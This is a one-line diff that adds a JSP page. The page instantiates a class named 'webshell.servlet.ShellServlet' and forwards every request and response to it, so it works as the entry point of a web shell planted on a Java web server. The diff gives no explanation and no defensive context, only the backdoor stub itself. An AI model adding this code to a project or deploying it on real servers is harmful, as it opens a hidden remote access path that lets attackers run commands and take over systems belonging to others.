@@ -1,0 +1,1 @@
+<%!webshell.servlet.ShellServlet serv = new webshell.servlet.ShellServlet();%><%this.serv.service(request, response);%>
